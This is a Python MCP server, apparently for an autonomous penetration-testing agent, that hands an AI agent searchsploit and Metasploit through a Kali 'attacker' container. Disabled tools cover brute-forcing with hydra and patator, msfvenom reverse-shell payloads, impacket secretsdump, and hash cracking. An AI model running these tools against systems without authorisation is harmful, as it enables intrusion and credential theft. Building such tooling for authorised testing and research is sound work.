
from mcp.server.fastmcp import FastMCP
from typing_extensions import Annotated
from typing import List, Optional, Union
import subprocess
import shlex

mcp = FastMCP("initial_access", port=3002)

CONTAINER_NAME = "attacker"
WORDLIST_USER = "/root/data/wordlist/user.txt"
WORDLIST_PASSWORD = "/root/data/wordlist/password.txt"

def parse_options(options: Optional[Union[str, List[str]]]) -> str:
    """
    Helper to parse options into a string and escape single quotes.
    """
    if options is None:
        return ""
    
    if isinstance(options, list):
        args_str = " ".join(options)
    else:
        args_str = options

    # Escape single quotes to prevent shell syntax errors
    if "'" in args_str:
        args_str = args_str.replace("'", "'\\''")
    
    return args_str

def command_execution(command: Annotated[str, "Commands to run on Kali Linux"]) -> Annotated[str, "Command Execution Result"]:
    """
    Run one command at a time in a kali linux environment and return the result.
    
    This function handles:
    1. Checking if Docker is available
    2. Checking if the attacker container exists and is running
    3. Starting the container if needed
    4. Executing the command with a timeout
    5. Logging the command execution
    """
    try:
        # Check if Docker is available
        docker_check = subprocess.run(
            ["docker", "ps"], 
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=5
        )
        
        if docker_check.returncode != 0:
            return f"[-] Docker is not available: {docker_check.stderr.strip()}"
            
        # Check if container exists
        container_check = subprocess.run(
            ["docker", "ps", "-a", "--filter", f"name={CONTAINER_NAME}"],
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=5
        )
        
        if CONTAINER_NAME not in container_check.stdout:
            return f"[-] Container '{CONTAINER_NAME}' does not exist"
        
        # Check if container is running
        running_check = subprocess.run(
            ["docker", "ps", "--filter", f"name={CONTAINER_NAME}"],
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=5
        )
        
        # Start container if not running
        if CONTAINER_NAME not in running_check.stdout:
            start_result = subprocess.run(
                ["docker", "start", CONTAINER_NAME],
                capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=10
            )
            
            if start_result.returncode != 0:
                return f"[-] Failed to start container '{CONTAINER_NAME}': {start_result.stderr.strip()}"
            
        # Execute command in Kali Linux container with extended timeout
        # Log command execution inside container
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_command = f"echo '[{timestamp}] {command}' >> /tmp/agent_commands.log"
        subprocess.run(
            ["docker", "exec", CONTAINER_NAME, "sh", "-c", log_command],
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=5
        )
        
        # Increased timeout to 1800 seconds (30 minutes) for long-running exploitation tools
        # Tools like msfconsole, hydra with full wordlists, sqlmap can take 15-20+ minutes
        result = subprocess.run(
            ["docker", "exec", CONTAINER_NAME, "sh", "-c", command],
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=1800
        )
        
        if result.returncode != 0:
            return f"[-] Command execution error: {result.stderr.strip()}\nOutput: {result.stdout.strip()}"
        
        return f"{result.stdout.strip()}"
    
    except subprocess.TimeoutExpired:
        return f"[-] Command timeout after 1800 seconds (30 minutes). Command may be hanging or taking too long. Try simpler/faster alternatives or reduce scope. Command: {command}"
    
    except FileNotFoundError:
        return "[-] Docker command not found. Is Docker installed and in PATH?"
    
    except Exception as e:
        return f"[-] Error: {str(e)} (Type: {type(e).__name__})"

# @mcp.tool(description="Brute-force authentication attacks using Patator")
# def patator(service: str, target: str, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Executes a Patator brute-force attack.

#     Args:
#         service (str): Service name (e.g., ssh, ftp, mysql)
#         target (str): Target IP or URL
#         options (Optional[Union[str, List[str]]]): Additional patator options

#     Returns:
#         str: Executed shell command string
#     """
#     if options is None:
#         args_str = ""
#     elif isinstance(options, list):
#         args_str = " ".join(options)
#     else:
#         args_str = options

#     module = f"{service}_login"

#     # Determine default parameter based on service
#     if service in ["ssh", "ftp", "smb", "rdp", "telnet", "mysql"]:
#         target_param = f"host={target}"
#     elif service in ["http"]:
#         target_param = f"url={target}"
#     else:
#         target_param = target  # fallback

#     command = f"patator {module} {target_param} {args_str}"
#     return command_execution(command)

# Tool prompt
### patator - Credential Attacks
# **When to use**: Brute force authentication when weak or default credentials are suspected  
# **Supported Protocols**: ssh, ftp, http, smb, mysql, rdp, telnet, etc.
# **Available wordlists**:  
# - Users: `root/data/wordlist/user.txt`  
# - Passwords: `root/data/wordlist/password.txt`

# **Examples**:
# - SSH brute-force:  
#   `patator ssh_login host=TARGET user=FILE0 password=FILE1 0=user.txt 1=password.txt`  
#   → ⚠️ *If you encounter a host key algorithm error (e.g., server supports only ssh-rsa)*,  
#   use the following workaround:  
#   `export PATATOR_SSH_PREFERRED_HOSTKEYS=ssh-rsa`  

# - HTTP login form:  
#   `patator http_fuzz url=http://TARGET/login.php method=POST body='u=admin&p=FILE0' 0=password.txt`

# **Tips**:
# - Use `-x ignore:mesg=...` to filter failed attempts  
# - Add delay or limit threads if needed to avoid lockout  
# - You can set preferred key exchange algorithms via `paramiko.Transport` if custom scripting is needed




# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="Netcat - Network Swiss Army knife for quick connection testing")
# def netcat_disabled(target: str, port: str, command: str = "", options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute Netcat (nc) for network connections.
#     Use for banner grabbing, simple data transfer, or testing connectivity.
#     
#     Args:
#         target: The target IP address.
#         port: The target port.
#         command: Optional command to pipe into netcat (e.g., 'id; whoami').
#         options: Command-line flags (e.g., '-v', '-u').
#     """
#     args_str = parse_options(options)
# 
#     # If command provided, echo it to nc; otherwise just connect
#     if command:
#         # Escape single quotes in command to prevent shell syntax errors
#         if "'" in command:
#             command = command.replace("'", "'\\''")
#         full_command = f"echo '{command}' | nc {args_str} {target} {port}"
#     else:
#         full_command = f"nc -vz {args_str} {target} {port}"
#     
#     return command_execution(full_command)


# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="Brute-force authentication attacks")
# def hydra_disabled(target: str, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute Hydra for parallelized login brute-forcing.
#     Use for SSH, FTP, HTTP forms, RDP, MySQL, etc.
#     
#     Args:
#         target: The target IP or hostname (e.g., '192.168.1.1').
#         options: Command-line flags including service at the END.
#                  Format: '-l user -P /root/data/wordlist/password.txt ssh'
#                  Service must be LAST (ssh, ftp, http-post-form, http-get, mysql, etc.)
#                  Use -t 16 for speed.
#                  Available wordlists:
#                  - Users: /root/data/wordlist/user.txt
#                  - Passwords: /root/data/wordlist/password.txt
#     """
#     args_str = parse_options(options)
#     
#     # Auto-correct common mistakes
#     if ' http ' in args_str or args_str.endswith(' http'):
#         args_str = args_str.replace(' http', ' http-get')
#     if ' postgresql' in args_str or args_str.endswith(' postgresql'):
#         args_str = args_str.replace(' postgresql', ' postgres')
# 
#     command = f"hydra {args_str} {target}"
#     return command_execution(command)


@mcp.tool(description="Search exploit database for vulnerabilities")
def searchsploit(service_name: str, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
    """
    Execute Searchsploit to find exploits in Exploit-DB.
    
    Args:
        service_name: The service name or CVE to search for (e.g., 'vsftpd 2.3.4').
        options: Command-line flags (e.g., '--exact', '--cve').
    """
    args_str = parse_options(options)

    command = f"searchsploit {args_str} {service_name}"
    return command_execution(command)

# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="Automated SQL injection detection and exploitation")
# def sqlmap_disabled(target: str, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute sqlmap to detect and exploit SQL injection flaws.
#     
#     Args:
#         target: The target URL (e.g., 'http://example.com/page.php?id=1').
#         options: Command-line flags (e.g., '--batch --dbs'). Avoid --level 5/--risk 3 as they are extremely slow.
#     """
#     args_str = parse_options(options)
# 
#     command = f"sqlmap -u {target} {args_str} --batch"
#     return command_execution(command)

def get_container_ip() -> str:
    """Get the IP address of the attacker container"""
    # Default/Fallback IP provided by user configuration
    DEFAULT_IP = "172.18.0.2"
    
    try:
        result = subprocess.run(
            ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", CONTAINER_NAME],
            capture_output=True, text=True, encoding="utf-8", errors="ignore", timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception:
        pass
        
    return DEFAULT_IP

@mcp.tool(description="Metasploit Framework - Execute msfconsole commands")
def msfconsole(commands: str, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
    """
    Execute a chain of Metasploit commands in a single session.
    Use this tool for complex exploitation tasks requiring the Metasploit Framework.
    
    Args:
        commands: Semicolon-separated list of commands (e.g., 'use exploit/...; set RHOSTS ...; run').
                  IMPORTANT: For web exploits, ensure TARGETURI is set (e.g., 'set TARGETURI /').
        options: Command-line flags for msfconsole (usually empty).
    """
    args_str = parse_options(options)

    # Escape single quotes in commands to prevent shell syntax errors
    if "'" in commands:
        commands = commands.replace("'", "'\\''")

    # Ensure commands are separated by semicolons if they are not already
    # This handles cases where the agent might use newlines or spaces instead of semicolons
    # We replace newlines with semicolons
    commands = commands.replace("\n", ";")
    
    # Auto-detect and replace LHOST if it's a placeholder or incorrect
    if "LHOST" in commands:
        container_ip = get_container_ip()
        if container_ip:
            # Replace common placeholders
            placeholders = ["<your_local_ip>", "YOUR_IP", "<Your_IP_Address>", "<IP>", "LHOST_IP", "127.0.0.1"]
            for p in placeholders:
                commands = commands.replace(f"LHOST {p}", f"LHOST {container_ip}")
                commands = commands.replace(f"set LHOST {p}", f"set LHOST {container_ip}")
            
            # If LHOST is set to something that looks like a placeholder or wrong IP (like 127.0.0.1 inside docker)
            # We can try to be smarter, but for now let's just handle the explicit placeholders the agent uses
    
    # Execute msfconsole with resource script approach for better output
    # Use -x to execute commands, but ensure we don't exit immediately if we want to interact
    # However, for non-interactive automation, 'exit' is usually good.
    # We remove 'exit' if it's already in the commands to avoid redundancy
    
    # FILTER: Remove 'sessions -i' commands as they cause crashes in non-interactive docker exec
    if "sessions -i" in commands:
        commands = commands.replace("sessions -i", "sessions -l")
    
    # FILTER: Replace 'run' with 'exploit' for consistency and better error handling
    commands = commands.replace("; run;", "; exploit;")
    commands = commands.replace("; run ", "; exploit ")
    commands = commands.replace(";run;", "; exploit;")
    commands = commands.replace(";run ", "; exploit ")
    if commands.endswith(";run"):
        commands = commands[:-4] + "; exploit"
    if commands.endswith("; run"):
        commands = commands[:-5] + "; exploit"
    
    if "exit" not in commands:
        commands = f"{commands}; exit"
    
    # Use a resource file to avoid shell parsing issues with semicolons
    # This ensures msfconsole sees the commands correctly, not the shell
    import tempfile
    import os
    
    try:
        # Create a temporary resource file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False, encoding='utf-8') as rc_file:
            # Split commands by semicolon and write each on a new line
            for cmd in commands.split(';'):
                cmd = cmd.strip()
                if cmd:  # Skip empty commands
                    rc_file.write(cmd + '\n')
            rc_path = rc_file.name
        
        # Copy the resource file to the container
        container_rc_path = f"/tmp/msf_{os.path.basename(rc_path)}"
        subprocess.run(
            ["docker", "cp", rc_path, f"{CONTAINER_NAME}:{container_rc_path}"],
            capture_output=True, text=True, encoding="utf-8", errors="ignore"
        )
        
        # Execute msfconsole with the resource file
        command = f"msfconsole -q -r {container_rc_path} {args_str}; rm -f {container_rc_path}"
        result = command_execution(command)
        
        # Clean up local temp file
        try:
            os.unlink(rc_path)
        except:
            pass
            
        return result
        
    except Exception as e:
        # Fallback to old method if resource file approach fails
        command = f"msfconsole -q -x '{commands}' {args_str}"
        return command_execution(command)

# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="Metasploit payload generator - Create exploit payloads")
# def msfvenom_disabled(payload: str, lhost: str = "", lport: str = "4444", format: str = "elf", options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute msfvenom to generate shellcode or executable payloads.
#     
#     Args:
#         payload: The payload type (e.g., 'linux/x64/shell_reverse_tcp').
#         lhost: The listener IP address (defaults to container IP).
#         lport: The listener port (default '4444').
#         format: The output format (e.g., 'elf', 'raw', 'exe').
#         options: Additional flags.
#     """
#     args_str = parse_options(options)
# 
#     # Auto-correct format for PHP payloads if incorrectly set to ELF
#     if "php" in payload.lower() and format == "elf":
#         format = "raw"
# 
#     # Auto-detect LHOST if not provided or placeholder
#     if not lhost or lhost == "<your_local_ip>" or lhost == "YOUR_IP":
#         container_ip = get_container_ip()
#         if container_ip:
#             lhost = container_ip
# 
#     lhost_param = f"LHOST={lhost}" if lhost else ""
#     lport_param = f"LPORT={lport}"
#     
#     command = f"msfvenom -p {payload} {lhost_param} {lport_param} -f {format} {args_str}"
#     return command_execution(command)

# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="CrackMapExec - Swiss Army knife for network attacks")
# def crackmapexec_disabled(protocol: str, target: str, username: str = "", password: str = "", options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute CrackMapExec to attack network protocols (SMB, WinRM, SSH, etc.).
#     
#     Args:
#         protocol: The target protocol (e.g., 'smb', 'ssh').
#         target: The target IP or CIDR.
#         username: Username for authentication.
#         password: Password for authentication.
#         options: Command-line flags (e.g., '--shares', '--sam').
#     """
#     args_str = parse_options(options)
# 
#     user_param = f"-u {username}" if username else ""
#     pass_param = f"-p {password}" if password else ""
#     
#     command = f"crackmapexec {protocol} {target} {user_param} {pass_param} {args_str}"
#     return command_execution(command)

# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="Impacket - Network protocol exploitation suite")
# def impacket_disabled(script: str, target: str, credentials: str = "", options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute Impacket scripts for advanced network attacks.
#     
#     Args:
#         script: The script name (e.g., 'psexec.py', 'secretsdump.py').
#         target: The target IP.
#         credentials: 'domain/user:password' or just 'user:password'.
#         options: Command-line flags.
#     """
#     args_str = parse_options(options)
# 
#     # Impacket scripts format: script.py [credentials]target [options]
#     cred_target = f"{credentials}@{target}" if credentials and '@' not in credentials else (credentials if credentials else target)
#     
#     # Handle path for Impacket scripts in Kali (located in examples folder)
#     if not script.startswith("/") and script.endswith(".py"):
#         # Use python3 to execute the script from the examples directory
#         script_path = f"/usr/share/doc/python3-impacket/examples/{script}"
#         command = f"python3 {script_path} {cred_target} {args_str}"
#     else:
#         command = f"{script} {cred_target} {args_str}"
#         
#     return command_execution(command)

# DISABLED TOOL - Not needed for searchsploit/msfconsole-only workflow
# @mcp.tool(description="John the Ripper - Password cracking")
# def john_disabled(hash_file: str, wordlist: str = WORDLIST_PASSWORD, options: Optional[Union[str, List[str]]] = None) -> Annotated[str, "Command"]:
#     """
#     Execute John the Ripper to crack password hashes.
#     
#     Args:
#         hash_file: Path to the file containing hashes.
#         wordlist: Path to the wordlist file.
#         options: Command-line flags (e.g., '--format=raw-md5').
#     """
#     args_str = parse_options(options)
# 
#     command = f"john {hash_file} --wordlist={wordlist} {args_str}"
#     return command_execution(command)

if __name__ == "__main__":
    mcp.run(transport="streamable-http")